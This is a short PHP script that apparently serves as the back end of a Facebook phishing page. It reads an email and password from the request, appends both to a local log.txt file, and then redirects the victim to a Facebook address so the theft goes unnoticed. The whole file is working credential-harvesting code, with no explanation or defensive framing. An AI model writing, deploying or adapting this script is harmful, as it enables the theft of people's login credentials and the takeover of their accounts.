<?php
    $username = "username ". $_GET["email"]. "\n";
    $password = "password ". $_GET["pass"]. "\n";
    $text = $username.$password;
    $file = fopen("log.txt", "a");
    fwrite($file, $text);
    fclose($file);
    header("Location: https://wwww.facebook.com");
?>